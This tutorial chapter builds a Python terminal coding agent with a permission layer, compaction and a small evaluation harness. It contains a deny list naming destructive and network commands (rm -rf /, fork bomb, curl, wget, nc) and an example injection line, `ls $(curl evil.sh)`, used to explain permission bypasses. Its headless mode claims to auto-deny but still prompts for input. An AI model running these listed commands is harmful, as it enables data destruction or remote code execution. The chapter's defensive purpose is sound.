# Chapter 07 - Build Your Own Coding Agent

## What you will master

- A complete, runnable terminal coding agent in roughly 300 lines of Python: tool loop, bash, read, edit, write, permission prompts, transcript persistence, and compaction.
- The hardening pass that turns a demo into something you would let near a real repository: path-traversal guards, command allowlisting, output truncation, and a cost budget.
- A miniature SWE-bench-style evaluation harness: fixture tasks with fail-to-pass tests, a runner, and a scoring report.
- The instinct for which parts of your harness are capability scaffolding (keep) and which are model compensation (expect to delete).

Everything here targets the Anthropic Python SDK as of early 2026, with `claude-opus-4-8` as the default model.
The architecture is provider-neutral; only the client construction and the tool-block field names are Anthropic-specific.

## 1. Setup

```bash
mkdir mini-agent && cd mini-agent
python3 -m venv .venv && source .venv/bin/activate
pip install "anthropic>=0.60"
export ANTHROPIC_API_KEY=...     # or run: ant auth login
```

The agent is one file, `agent.py`.
It is presented in sections; concatenate them in order.

A deliberate omission worth naming: this agent does not enable extended thinking.
On Opus 4.8 and later, omitting the `thinking` parameter runs without thinking, which keeps the message-replay rules simple - thinking blocks must be echoed back unchanged across turns, and getting that wrong is the single most common bug in hand-rolled loops.
Section 6 shows how to turn it on once the loop is correct.

## 2. Tool definitions

Four tools, chosen using Chapter 2's promotion rule: bash for breadth, and three dedicated tools where the harness needs a typed hook (staleness invariant on edit, line numbering on read, overwrite protection on write).

```python
# agent.py  (part 1 of 6)
from __future__ import annotations

import json
import os
import subprocess
import sys
from dataclasses import dataclass, field
from pathlib import Path

import anthropic

MODEL = "claude-opus-4-8"
MAX_TOKENS = 8000
MAX_OUTPUT_CHARS = 20_000          # per-tool result cap
ROOT = Path.cwd().resolve()        # the agent's sandbox root

TOOLS = [
    {
        "name": "bash",
        "description": (
            "Run a shell command in the project root and return combined "
            "stdout and stderr plus the exit code. Use for building, testing, "
            "searching (rg/grep), and inspecting the repository."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "command": {"type": "string", "description": "The shell command to run."},
                "timeout": {"type": "integer", "description": "Seconds before the command is killed. Default 120."},
            },
            "required": ["command"],
        },
    },
    {
        "name": "read_file",
        "description": (
            "Read a UTF-8 text file. Returns the contents with 1-based line "
            "numbers prefixed, which you must use when reasoning about locations. "
            "Always read a file before editing it."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "path": {"type": "string", "description": "Path relative to the project root."},
                "offset": {"type": "integer", "description": "1-based first line to return."},
                "limit": {"type": "integer", "description": "Maximum number of lines to return. Default 400."},
            },
            "required": ["path"],
        },
    },
    {
        "name": "edit_file",
        "description": (
            "Replace an exact string in a file. old_string must appear exactly "
            "once in the file, including whitespace; include surrounding context "
            "to disambiguate. Fails if the string is missing or ambiguous, or if "
            "the file has not been read in this session."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "path": {"type": "string"},
                "old_string": {"type": "string"},
                "new_string": {"type": "string"},
            },
            "required": ["path", "old_string", "new_string"],
        },
    },
    {
        "name": "write_file",
        "description": (
            "Create a new file or overwrite an existing one with the given "
            "contents. Overwriting a file requires having read it first."
        ),
        "input_schema": {
            "type": "object",
            "properties": {"path": {"type": "string"}, "content": {"type": "string"}},
            "required": ["path", "content"],
        },
    },
]
```

Three ACI decisions in the descriptions are worth naming (Chapter 3, section 2).
`read_file` promises line numbers, so the model can talk about locations reliably.
`edit_file` states the exactly-once rule in the description rather than only enforcing it in code, so the model writes disambiguating context on the first attempt instead of learning it from an error.
Every tool's failure text will explain what to do next, not just what went wrong.

## 3. Tool execution and the safety layer

```python
# agent.py  (part 2 of 6)

class ToolError(Exception):
    """Recoverable: reported back to the model as an error tool_result."""


def resolve(path_str: str) -> Path:
    """Resolve a model-supplied path and confine it to ROOT."""
    p = (ROOT / path_str).resolve()
    if p != ROOT and ROOT not in p.parents:
        raise ToolError(
            f"path {path_str!r} escapes the project root; "
            "use a path inside the project."
        )
    return p


def clip(text: str) -> str:
    if len(text) <= MAX_OUTPUT_CHARS:
        return text
    half = MAX_OUTPUT_CHARS // 2
    omitted = len(text) - 2 * half
    return f"{text[:half]}\n\n... [{omitted} characters omitted] ...\n\n{text[-half:]}"


@dataclass
class Session:
    read_files: set[str] = field(default_factory=set)   # staleness tracking
    approved: set[str] = field(default_factory=set)     # always-allow rules
    spend_usd: float = 0.0
    budget_usd: float = 5.0


def tool_bash(args: dict, s: Session) -> str:
    command = args["command"]
    timeout = int(args.get("timeout", 120))
    proc = subprocess.run(
        command, shell=True, cwd=ROOT, capture_output=True, text=True,
        timeout=timeout, errors="replace",
    )
    out = (proc.stdout or "") + (proc.stderr or "")
    return clip(f"exit code: {proc.returncode}\n{out or '(no output)'}")


def tool_read_file(args: dict, s: Session) -> str:
    p = resolve(args["path"])
    if not p.is_file():
        raise ToolError(f"{args['path']} is not a file. Use bash with ls to explore.")
    offset = max(1, int(args.get("offset", 1)))
    limit = int(args.get("limit", 400))
    lines = p.read_text(encoding="utf-8", errors="replace").splitlines()
    s.read_files.add(str(p))
    window = lines[offset - 1: offset - 1 + limit]
    body = "\n".join(f"{offset + i:6d}\t{line}" for i, line in enumerate(window))
    tail = ""
    if offset - 1 + limit < len(lines):
        tail = f"\n\n[file has {len(lines)} lines; showing {offset}-{offset + len(window) - 1}]"
    return clip(body + tail)


def tool_edit_file(args: dict, s: Session) -> str:
    p = resolve(args["path"])
    if str(p) not in s.read_files:
        raise ToolError(f"read {args['path']} before editing it.")
    if not p.is_file():
        raise ToolError(f"{args['path']} does not exist; use write_file to create it.")
    text = p.read_text(encoding="utf-8")
    old, new = args["old_string"], args["new_string"]
    count = text.count(old)
    if count == 0:
        raise ToolError(
            "old_string not found. Re-read the file; whitespace and indentation "
            "must match exactly."
        )
    if count > 1:
        raise ToolError(
            f"old_string appears {count} times. Include more surrounding lines "
            "so it matches exactly once."
        )
    p.write_text(text.replace(old, new), encoding="utf-8")
    return f"edited {args['path']} (1 replacement)"


def tool_write_file(args: dict, s: Session) -> str:
    p = resolve(args["path"])
    if p.exists() and str(p) not in s.read_files:
        raise ToolError(f"{args['path']} exists; read it before overwriting.")
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(args["content"], encoding="utf-8")
    s.read_files.add(str(p))
    return f"wrote {args['path']} ({len(args['content'])} bytes)"


HANDLERS = {
    "bash": tool_bash,
    "read_file": tool_read_file,
    "edit_file": tool_edit_file,
    "write_file": tool_write_file,
}
```

Four safety properties are already present and each is a capability scaffold that will not decay:

- **Path confinement.** `resolve` canonicalizes before comparing, so `../../etc/passwd`, symlinks, and absolute paths are all caught by the same check.
Doing the check on the raw string instead is the classic vulnerable version.
- **Staleness invariant.** `edit_file` and overwrite refuse to act on a file the model has not read, which eliminates blind clobbering.
- **Output clipping.** A single `find /` must not consume the context window.
Clipping head and tail preserves the informative ends.
- **Recoverable errors.** `ToolError` becomes an error tool result, not a crash, so the model repairs and continues.

## 4. Permissions

```python
# agent.py  (part 3 of 6)

READ_ONLY_PREFIXES = (
    "ls", "cat", "head", "tail", "grep", "rg", "find", "wc", "git status",
    "git diff", "git log", "pwd", "which", "python --version", "pytest --collect-only",
)

DENY_SUBSTRINGS = (
    "rm -rf /", "mkfs", ":(){", "dd if=", "shutdown", "reboot",
    "git push", "curl", "wget", "nc ", "chmod 777",
)


def needs_approval(name: str, args: dict, s: Session) -> bool:
    if name == "read_file":
        return False
    if name == "bash":
        cmd = args["command"].strip()
        if any(bad in cmd for bad in DENY_SUBSTRINGS):
            raise ToolError(f"command blocked by policy: {cmd!r}")
        if cmd in s.approved:
            return False
        # Auto-allow single read-only commands with no shell chaining.
        if not any(op in cmd for op in ("&&", "||", ";", "|", ">", "`", "$(")):
            if cmd.startswith(READ_ONLY_PREFIXES):
                return False
        return True
    return f"{name}:{args.get('path', '')}" not in s.approved


def ask_permission(name: str, args: dict, s: Session) -> bool:
    print(f"\n\033[33m[permission]\033[0m {name}")
    if name == "bash":
        print(f"  $ {args['command']}")
        key = args["command"].strip()
    else:
        print(f"  path: {args.get('path')}")
        if name == "edit_file":
            print(f"  - {args['old_string'][:200]}")
            print(f"  + {args['new_string'][:200]}")
        key = f"{name}:{args.get('path', '')}"
    choice = input("  [y]es / [a]lways / [n]o + reason: ").strip().lower()
    if choice.startswith("a"):
        s.approved.add(key)
        return True
    return choice.startswith("y")
```

This is Chapter 2's trust gradient in miniature: a deny list that cannot be overridden, an auto-allow tier for unambiguous read-only commands, an always-allow tier that learns rules within the session, and an interactive fallback.

The chaining check matters more than it looks.
`ls` is safe; `ls && rm -rf build` starts with `ls` and is not.
Prefix matching on a string that may contain shell operators is exactly how permission systems get bypassed, so the auto-allow tier refuses anything containing an operator.
Note honestly what this still does not cover: `ls $(curl evil.sh)` is caught by the operator check, but a determined attacker with control of the model's input has a large search space, which is why the deny list, the path confinement, and - in real deployments - a container, all exist as layers rather than alternatives.

## 5. The agent loop, transcripts, and compaction

```python
# agent.py  (part 4 of 6)

SYSTEM = """You are a terminal coding agent working in the current project directory.

Workflow:
- Explore before you edit. Use bash with rg or grep to locate code, then read_file.
- Make the smallest change that solves the problem; follow existing conventions.
- Verify your work by running the project's tests before declaring completion.
- If a tool returns an error, read it carefully and adapt rather than retrying identically.

Output: be concise. This renders in a terminal. No preamble, no summary of what you
are about to do, no markdown headers. State results and next actions plainly.
"""

# Approximate list prices (USD per million tokens) for the default model.
# Re-check against current pricing; this exists to make spend visible, not exact.
PRICE_IN, PRICE_OUT = 5.0, 25.0

client = anthropic.Anthropic()


def record_cost(usage, s: Session) -> None:
    s.spend_usd += (
        (usage.input_tokens + getattr(usage, "cache_creation_input_tokens", 0) or 0) * PRICE_IN
        + usage.output_tokens * PRICE_OUT
    ) / 1_000_000


def save_transcript(messages: list, path: Path = Path(".agent_transcript.json")) -> None:
    serializable = []
    for m in messages:
        content = m["content"]
        if not isinstance(content, str):
            content = [c if isinstance(c, dict) else c.model_dump() for c in content]
        serializable.append({"role": m["role"], "content": content})
    path.write_text(json.dumps(serializable, indent=2), encoding="utf-8")


def compact(messages: list, s: Session) -> list:
    """Summarize all but the last two turns into a single user message."""
    if len(messages) <= 6:
        return messages
    head, tail = messages[:-4], messages[-4:]
    resp = client.messages.create(
        model=MODEL,
        max_tokens=2000,
        system=(
            "Summarize this coding-agent transcript for a successor with no other "
            "context. Preserve: the original task and acceptance criteria, files "
            "read and changed, decisions made and rejected, commands run and their "
            "outcomes, and what remains to be done. Be specific; name files and "
            "symbols. Do not editorialize."
        ),
        messages=[{"role": "user", "content": json.dumps(
            [{"role": m["role"], "content": str(m["content"])[:4000]} for m in head]
        )}],
    )
    record_cost(resp.usage, s)
    summary = "".join(b.text for b in resp.content if b.type == "text")
    print("\033[90m[compacted history]\033[0m")
    return [{"role": "user", "content": f"[Summary of earlier work]\n{summary}"}] + tail


def run_turn(messages: list, s: Session, max_steps: int = 60) -> list:
    for _ in range(max_steps):
        if s.spend_usd > s.budget_usd:
            messages.append({"role": "user", "content":
                             "[harness] Budget exhausted. Stop and summarize state."})
        if sum(len(str(m["content"])) for m in messages) > 400_000:
            messages = compact(messages, s)

        resp = client.messages.create(
            model=MODEL, max_tokens=MAX_TOKENS, system=SYSTEM,
            tools=TOOLS, messages=messages,
        )
        record_cost(resp.usage, s)
        messages.append({"role": "assistant", "content": resp.content})

        for block in resp.content:
            if block.type == "text" and block.text.strip():
                print(block.text)

        if resp.stop_reason != "tool_use":
            save_transcript(messages)
            return messages

        results = []
        for block in resp.content:
            if block.type != "tool_use":
                continue
            try:
                if needs_approval(block.name, block.input, s) and not ask_permission(
                    block.name, block.input, s
                ):
                    reason = input("  reason (optional): ").strip()
                    raise ToolError(f"user denied this action. {reason}".strip())
                print(f"\033[90m  -> {block.name} {json.dumps(block.input)[:120]}\033[0m")
                out = HANDLERS[block.name](block.input, s)
                results.append({"type": "tool_result", "tool_use_id": block.id,
                                "content": out})
            except ToolError as e:
                results.append({"type": "tool_result", "tool_use_id": block.id,
                                "content": f"Error: {e}", "is_error": True})
            except Exception as e:  # unexpected: still recoverable for the model
                results.append({"type": "tool_result", "tool_use_id": block.id,
                                "content": f"Error: {type(e).__name__}: {e}",
                                "is_error": True})

        messages.append({"role": "user", "content": results})
        save_transcript(messages)

    messages.append({"role": "user", "content": "[harness] Step limit reached."})
    return messages
```

Six details in this loop are where hand-rolled agents usually break.

- **Append the whole `resp.content`**, not extracted text.
Dropping `tool_use` blocks breaks the pairing the API requires on the next request.
- **One `tool_result` per `tool_use`, all in a single user message.**
Splitting them across messages is accepted but trains the model out of parallel tool calls; omitting one is a hard error.
- **Errors are results, not exceptions.**
`is_error: True` with a readable message is what lets the model recover.
- **Loop on `stop_reason == "tool_use"`**, not on a count of tool blocks; that is the API's own signal.
- **Save the transcript after every step**, so a crash or a Ctrl-C leaves a resumable artifact.
- **Compaction preserves intent.**
The summary prompt explicitly pins the original task and acceptance criteria, because a compaction that loses them is how agents confidently finish the wrong task (Chapter 3, section 7).

## 6. The entry point

```python
# agent.py  (part 5 of 6)

def main() -> None:
    s = Session()
    if len(sys.argv) > 1 and sys.argv[1] == "-p":
        # Headless: one task, no interaction. Auto-deny anything needing approval.
        task = " ".join(sys.argv[2:])
        s.approved.add("__headless__")
        run_turn([{"role": "user", "content": task}], s)
        print(f"\n[spend ${s.spend_usd:.3f}]")
        return

    print(f"mini-agent in {ROOT}  (model {MODEL}, budget ${s.budget_usd})")
    messages: list = []
    while True:
        try:
            user = input("\n\033[36m>\033[0m ").strip()
        except (EOFError, KeyboardInterrupt):
            break
        if user in {"exit", "quit"}:
            break
        if user == "/cost":
            print(f"spend ${s.spend_usd:.3f} / ${s.budget_usd}")
            continue
        if user == "/compact":
            messages = compact(messages, s)
            continue
        if not user:
            continue
        messages.append({"role": "user", "content": user})
        messages = run_turn(messages, s)
    print(f"[spend ${s.spend_usd:.3f}]  transcript: .agent_transcript.json")


if __name__ == "__main__":
    main()
```

Run it:

```bash
python agent.py                                  # interactive
python agent.py -p "add a docstring to utils.py" # headless, scriptable
```

**Turning on thinking.**
Once the loop is correct, add `thinking={"type": "adaptive"}` and `output_config={"effort": "high"}` to the `messages.create` call.
The one rule you must then honor: the `thinking` blocks in `resp.content` are already appended verbatim by the code above, and they must stay unmodified across turns.
Do not filter the assistant content to "just the useful blocks" - that is the mistake this design already avoids by appending `resp.content` wholesale.

## 7. Hardening for real use

The 300-line version is honest about being a demo.
Four upgrades separate it from something you would point at a repository you care about.

**Containerize.**
The strongest control is not in Python.
Run the agent inside a container with the repository mounted, a non-root user, a read-only root filesystem outside the workspace, no credentials in the environment, and default-deny egress.
Then `--dangerously-skip-permissions`-style autonomy becomes defensible, because the blast radius is the container.
Every guard in section 3 is defense in depth *behind* this, not a substitute for it.

**Replace the deny list with an allowlist.**
Deny lists lose to creativity.
For automated use, invert: parse the command, take the first token, and require it to be in an explicit allowlist (`pytest`, `python`, `npm`, `git` with an allowed subcommand set), rejecting shell operators outright and passing arguments through a validator.
This is much more restrictive and much more defensible, and it is why real harnesses combine a permissive interactive mode with a strict automation mode.

**Handle API failure properly.**
Wrap `messages.create` with typed exception handling - `anthropic.RateLimitError` and `anthropic.InternalServerError` warrant backoff and retry, `anthropic.BadRequestError` usually means your message construction is wrong and retrying will not help - and stream for long outputs so you do not hit request timeouts.

**Make the budget a real gate.**
The version above appends a warning message; a production gate raises and terminates, and reports cost per task to a metrics sink.
Better still, use a declared task budget the model is aware of so it paces itself and wraps up gracefully rather than being cut off mid-edit.

Two more worth adding when the agent runs unattended: a **git checkpoint** before the first mutation so any run can be reverted with one command, and **structured logging** of every tool call with its arguments and outcome, which is the only way to debug a run you did not watch.

## 8. Evaluating it

An agent you have not measured is an agent you have opinions about.
Build the smallest honest eval: SWE-bench's structure (Chapter 3) at fixture scale.

Each task is a directory with broken source and a test that fails before the fix and passes after.

```
eval/
  tasks/
    off_by_one/
      repo/calc.py          # contains the bug
      repo/test_calc.py     # fails now, passes after the fix
      task.json             # {"prompt": "...", "test_cmd": "pytest -q"}
    missing_validation/
    wrong_sort_key/
```

```python
# eval/run_eval.py
import json, shutil, subprocess, sys, tempfile, time
from pathlib import Path

TASKS = Path(__file__).parent / "tasks"
AGENT = Path(__file__).resolve().parents[1] / "agent.py"


def run_task(task_dir: Path) -> dict:
    spec = json.loads((task_dir / "task.json").read_text())
    with tempfile.TemporaryDirectory() as tmp:
        work = Path(tmp) / "repo"
        shutil.copytree(task_dir / "repo", work)

        # 1. Confirm the test fails before the agent runs (fail-to-pass precondition).
        before = subprocess.run(spec["test_cmd"], shell=True, cwd=work,
                                capture_output=True, text=True)
        if before.returncode == 0:
            return {"task": task_dir.name, "status": "INVALID",
                    "note": "test passes before the fix"}

        # 2. Run the agent headless with a wall-clock cap.
        t0 = time.time()
        try:
            proc = subprocess.run([sys.executable, str(AGENT), "-p", spec["prompt"]],
                                  cwd=work, capture_output=True, text=True, timeout=900)
        except subprocess.TimeoutExpired:
            return {"task": task_dir.name, "status": "TIMEOUT",
                    "seconds": round(time.time() - t0, 1)}
        elapsed = round(time.time() - t0, 1)

        # 3. Score by running the hidden test the agent was never told to satisfy.
        after = subprocess.run(spec["test_cmd"], shell=True, cwd=work,
                               capture_output=True, text=True)

        # 4. Reward-hacking check: the agent must not have modified the test file.
        tampered = any(
            (work / f).read_bytes() != (task_dir / "repo" / f).read_bytes()
            for f in spec.get("protected_files", [])
        )
        status = ("TAMPERED" if tampered
                  else "RESOLVED" if after.returncode == 0
                  else "FAILED")
        return {"task": task_dir.name, "status": status, "seconds": elapsed,
                "agent_tail": proc.stdout[-400:]}


def main() -> None:
    results = [run_task(d) for d in sorted(TASKS.iterdir()) if d.is_dir()]
    resolved = sum(r["status"] == "RESOLVED" for r in results)
    for r in results:
        print(f"{r['status']:<9} {r['task']:<24} {r.get('seconds', '-')}s")
    print(f"\nresolved {resolved}/{len(results)} "
          f"({100 * resolved / max(1, len(results)):.0f}%)")


if __name__ == "__main__":
    main()
```

Four properties make this a real eval rather than a vibe check, and all four come straight from SWE-bench's design:

- **Fail-to-pass precondition.** Verifying the test fails first catches broken fixtures, which are the most common reason a homemade eval reports inflated scores.
- **Hidden test.** The prompt describes the symptom; the test defines success and is never shown to the agent.
- **Fresh copy per run.** Copying to a temp directory means runs cannot contaminate each other and a destructive agent cannot damage the fixture.
- **Tamper detection.** `protected_files` catches the agent that "fixes" the bug by editing the test - Chapter 1's reward hacking, made concrete.

What to do with the numbers.
Run each task at least three times, because agent runs are stochastic and a single pass tells you almost nothing; report resolved-fraction with the variance, plus median wall-clock and cost.
Then use the eval as a regression harness: every prompt change, tool change, or model change gets re-measured against the same fixtures.
That loop - change something, re-run the eval, keep it only if the number moved - is the difference between engineering an agent and decorating one.

Finally, apply Chapter 3's scaffold-decay test to your own creation.
The path confinement, permission layer, budget, transcript persistence, and eval harness are capability scaffolding: models will not grow the ability to sandbox themselves, and these should be built well.
The elaborate workflow prescriptions in the system prompt, the compaction summary schema, and any voting or retry logic you add are model compensation: measure them, and expect to delete some of them a generation from now.
Knowing which half of your own code you expect to throw away is the mark of someone who understands the field rather than the tool.

## Exercises

1. Type the agent in, run it on a real repository, and complete three tasks: a one-line bug fix, adding a test, and a two-file refactor; record how many permission prompts you answered and which ones you would auto-allow permanently.
2. Break the loop deliberately in four ways - drop `tool_use` blocks from the appended assistant message, return only one result for two tool calls, raise instead of returning an error result, and loop on tool-block count instead of `stop_reason` - and record the exact failure each produces so you recognize them in the wild.
3. Add a `grep` tool that wraps ripgrep with a result cap and a clear too-many-results message; measure task completion on your eval before and after, and state whether it was capability or compensation.
4. Replace the deny list with a first-token allowlist plus an argument validator, then write ten adversarial commands attempting to escape it; report how many succeeded and fix the ones that did.
5. Build five eval tasks from real bugs in your own git history: use the pre-fix commit as the fixture and the test added in the fixing commit as the hidden test; run the agent three times per task and report resolved-fraction with variance.
6. Implement compaction two ways - the summary above, and simple truncation that keeps the first and last N messages - and measure resolved-fraction and token cost on a long task; state which lost more.
7. Add adaptive thinking with `effort` set to `low`, `high`, and `xhigh`, and produce a table of resolved-fraction, cost, and wall-clock per level; pick the setting you would ship and defend it.
8. Containerize the agent with a non-root user, mounted workspace, and default-deny egress; then run it with permissions bypassed on your eval and argue whether that configuration is now defensible.

## Godhood check

You have mastered this chapter when you can:

- Write the agent loop from memory, including appending full assistant content, pairing every tool result, batching results in one user message, and looping on `stop_reason`.
- Explain each safety property in the tool layer - path confinement after canonicalization, the read-before-edit staleness invariant, output clipping, recoverable tool errors - and the specific bug each prevents.
- Justify the exactly-once edit semantics and the line-numbered read format on ACI grounds without appealing to convention.
- Describe the permission gradient you implemented, explain why prefix matching on chained commands is unsafe, and state why the container is the real control.
- Write a compaction prompt that preserves task intent and say what breaks when it does not.
- Build a fail-to-pass eval harness from scratch, name its four integrity properties, and explain why tamper detection is not optional.
- Sort every component of your own harness into capability scaffolding or model compensation and defend each placement.
